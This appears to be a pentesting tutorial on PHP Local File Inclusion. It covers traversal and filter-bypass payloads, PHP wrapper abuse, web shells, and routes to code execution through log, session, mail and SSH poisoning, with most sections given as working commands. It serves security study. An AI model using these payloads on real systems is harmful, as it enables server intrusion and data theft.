# Local File Inclusion (LFI)

## Local File Inclusion

Local File Inclusion is a vulnerability that allows us to include files that are on the target server. Server-side languages such as PHP or JSP can dynamically include external scripts, reducing the script's overall size and simplifying the code. Attackers can include both local and remote files if this inclusion logic isn't checked, which could lead to source code leakage, sensitive data exposure, and code execution under some circumstances.

## LFI&#x20;

First, there must be a functionality that includes files.

Source Code Example:

```php
<?php
    $filename = $_GET['file'];
    include($filename);
?>
```

With this we can include any file on the system and display its contents on the web:

```
http://192.168.28.152/example.php?file=/etc/passwd
```

We can use curl, a browser or anything that renders URLs.

```
❯ curl 'http://192.168.28.152/example.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...
<SNIP>
```

However, with curl we have more control over what we want to do, in this case we can use bash and some tools to filter the output like so:

```
❯ curl -s 'http://192.168.28.152/example.php?file=/etc/passwd' | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
suer:x:1000:1000:user,,,:/home/suer:/bin/bash
```

### LFI Fuzzing

You are lazy to go through this manually or you just want to save some time... well just make some noise:

```
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI.txt --hw 0 http://dev.team.thm/script.php?page=/../../../../../FUZZ
```

### LFI with Directory Traversal

```php
<?php
    $filename = $_GET['file'];
    include("/var/www/html" . $filename);
?>
```

Since the directory is explicitly indicated under `/var/www/html` which are 3 directories `/1/2/3` then we must go 3 directories back with `../` so it'll look like this:

```
❯ curl -s 'http://192.168.28.152/directory_traversal.php?file=../../../../etc/passwd' | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
suer:x:1000:1000:user,,,:/home/suer:/bin/bash
```

Alternatively, we can go back more than 3 times and it'll still work:

```
root@ubuntu:/var/www/html# pwd
/var/www/html
root@ubuntu:/var/www/html# cd ../../../../../../../../
root@ubuntu:/# pwd
/
```

```
❯ curl -s 'http://192.168.28.152/directory_traversal.php?file=../../../../../../../etc/passwd' | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
suer:x:1000:1000:user,,,:/home/suer:/bin/bash
```

### LFI with Path Traversal

Developers may specify absolute paths when including files.

```php
include("./languages/" . $_GET['language']);
```

The statement above includes the files present in the languages folder.&#x20;

**Another Example**

Input from parameters can even be used as part of filenames. For example:

```php
include("lang_" . $_GET['language']);
```

In this scenario, input such as `../../../../../etc/passwd` will result in the final string to be `lang_../../../../../etc/passwd`, which is invalid. Prefixing a `/` before the payload will bypass the filename and traverse directories instead.

### LFI with Blacklisting

Scripts can employ search and replace techniques to avoid path traversals.&#x20;

```php
$language = str_replace('../', '', $_GET['language']);
```

It is not removing `../` recursively, which means removing the occurrences from the string a single time. If removing `../`, creates a new instance of `../`, the new instance will not be removed. For example, both `..././` and `....//` would become `../` after the replace function.

```php
$lfi = "....././/..../..//filename";
while( substr_count($lfi, '../', 0)) {
 $lfi = str_replace('../', '', $lfi);
};
```

Of course, the easiest method to fix this is to use `basename($ GET['language'])`, however this could damage your application if it goes inside a directory. While the following example works, it's ideal to try to find a native function to do the activity in your language or framework. Use a bash terminal and go into your home directly (cd \~ / cd $HOME) and run the command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for for the `?` and `*` wildcards to be used as a `.`.  We can use those symbols with directory traversal to achieve an LFI.

### **Bypass with URL Encoding**

String-based detection in PHP versions 5.3.4 and before could be circumvented by URL encoding the payload. The characters `../` can be URL encoded as `%2e%2e%2f` to avoid the filter.

The payload could be:`%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd`

### LFI with Appended Extension

Scripts can manually append a `.php` or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files.

```php
include($_GET['language'] . ".php");
```

## Bypass Extensions Filters

%00 = Null bytes terminate the string, this trick can be used to bypass file extensions added server-side and are useful for file inclusions because it prevents the file extension from being considered as part of the string.&#x20;

? = The question mark, marks anything added to the URL server-side as part of the query string. It can also use be used as an "alternative" to the null bytes trick.

## Wrappers

{% embed url="https://www.php.net/manual/en/wrappers.php" %}

### PHP Wrapper

We can the PHP wrapper base64 function to convert the contents of a resource to base64 encoding:

```
❯ curl -s 'http://192.168.28.152/example.php?file=php://filter/convert.base64-encode/resource=comment.php'
PD9waHAKCSRmaWxlbmFtZSA9ICRfR0VUWydmaWxlJ107CglpbmNsdWRlKCRmaWxlbmFtZSk7IC8vIFRoaXMgaXMgYSBjb21tZW50Cj8+Cg==
```

Then, we can decode it and read the source:

```
❯ echo 'PD9waHAKCSRmaWxlbmFtZSA9ICRfR0VUWydmaWxlJ107CglpbmNsdWRlKCRmaWxlbmFtZSk7IC8vIFRoaXMgaXMgYSBjb21tZW50Cj8+Cg==' | base64 -d
<?php
        $filename = $_GET['file'];
        include($filename); // This is a comment
?>
```

### Expect Wrapper

The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL will return the output of the id command.

* `http://victim.vmx/index.php?language=expect://id`

### Data Wrapper

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, even PHP code. It's possible to use this only if the `allow_url_include` setting is enabled in the PHP configuration. This can be found in the file `/etc/php/X.Y/apache2/php.ini` for Apache and in `/etc/php/X.Y/fpm/php.ini` for php-fpm used by Nginx, where `X.Y` is your install PHP version.

First, base64 encode a PHP web shell.

```
wixnic@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
```

Then include it using the data wrapper as shown below.

* `http://victim.vmx/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id`

### Input Wrapper

The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute code. In PHP it also needs the `allow_url_include` setting enabled. The following curl command sends a POST request with a system command and then includes it using `php://input`, which gets executed by the page.

```
wixnic@htb[/htb]$ curl -s -X POST --data "<?php system('id'); ?>" "http://victim.vmx/index.php?language=php://input" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Zip Wrapper

The [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper can prove useful in combination with file uploads. If the website enables arbitrary file uploads, an attacker might upload a malicious zip file containing PHP code. This wrapper isn't enabled by default, however, it can be activated with the command below.

```
wixnic@htb[/htb]$ apt install phpX.Y-zip
```

Follow the steps below to create a malicious archive.

```
wixnic@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
wixnic@htb[/htb]$ zip malicious.zip exec.php
wixnic@htb[/htb]$ rm exec.php
```

Next, copy `malicious.zip` to the web root to simulate the upload. The files in the zip archive can be referenced using the `#` symbol, which is URL-encoded in the request as `%23`.

## LFI to RCE via Upload

If you can upload a file, just inject the shell payload into it&#x20;

(e.g : `<?php system($_GET['cmd']); ?>` ).

```powershell
http://example.com/evil.php?cmd=/usr/bin/bash "echo test"
```

## LFI to RCE via PHP Wrappers

These are a few wrappers that we can use:

* Using file upload forms/functions
* Using the PHP wrapper expect://command
* Using the PHP wrapper php://file
* Using the PHP wrapper php://filter
* Using PHP input:// stream
* Using data://text/plain;base64,command

## LFI to RCE via PHP Sessions

Check if the website use PHP Session (PHPSESSID)

```js
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

In PHP these sessions are stored into `/var/lib/php5/sess_[PHPSESSID]` or `/var/lib/php/session/sess_[PHPSESSID]` files

```js
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Set the cookie to `<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## LFI to RCE via Mail PHP Execution

Send an email with telnet through SMTP:

```bash
telnet 192.168.1.X 25

HELO localhost

MAIL FROM:<root>

RCPT TO:<www-data>

DATA

<?php

echo shell_exec($_REQUEST['cmd']);
?>
```

Then, for example, access the file to execute code:

```url
http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=whoami
```

## LFI to RCE via Log Poisoning

This can be done with nc or telnet:

```
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

You can also add it to the error log by making a request to a page that doesn't exist:

```
nc 192.168.1.102 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Alternatively, we might be able to use the `` Referer` ``header using Burp:

```
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close
```

Alternatively, we might be able to use the `User-Agent` header using Burp:

```
GET / HTTP/1.1
Host: 192.168.1.159
User-Agent: <?php system($_GET['c']); ?>
```

Now you can request the log file through the LFI and see the php-code get executed:

```
http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
```

## LFI to RCE via SSH

Try to ssh into the box with a PHP code as the username `<?php system($_GET["cmd"]);?>:`

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

Then include the SSH log files inside the Web Application:

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

## LFI to RCE via Environ

The `/proc/self/environ` file can be abused using the User-Agent header:

```bash
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1

User-Agent: \<?=phpinfo(); ?\>
```
